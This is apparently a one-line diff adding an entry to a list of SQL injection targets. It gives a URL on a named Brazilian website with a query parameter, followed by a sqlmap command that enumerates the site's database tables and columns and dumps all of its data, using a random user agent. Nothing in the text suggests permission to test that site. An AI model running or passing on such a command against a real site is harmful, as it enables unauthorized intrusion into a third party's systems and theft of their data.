@@ -1,0 +1,1 @@
+http://www.cbma.com.br/index.php?t=pagina&a=arbitros&tip=2 (GET)  # sqlmap.py -u http://www.cbma.com.br/index.php?t=pagina&a=arbitros&tip=2 -D pg_catalog --threads 5 -v3 --random-agent --tables --columns --dump-all
